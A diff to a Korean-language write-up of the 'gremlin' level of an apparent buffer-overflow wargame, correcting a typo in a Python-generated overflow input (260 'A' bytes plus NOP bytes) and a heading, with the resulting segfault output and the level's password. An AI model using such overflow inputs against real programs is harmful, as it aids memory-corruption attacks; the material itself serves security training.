@@ -92,7 +92,7 @@ tmp파일 내에서
 을 넣어보자
 
 ```
-[gate@localhost tmp]$ ./gremlin `python -c 'print "A"*260  + "\x90\x90\x980\x90"'`
+[gate@localhost tmp]$ ./gremlin `python -c 'print "A"*260  + "\x90\x90\x90\x90"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
 Segmentation fault (core dumped)
 [gate@localhost tmp]$ ls
@@ -171,7 +171,7 @@ hello bof world
 ```
 
 ----
-###gremlin
+### gremlin
 ```
 id = 'gremlin'
 pw = 'hello bof world'
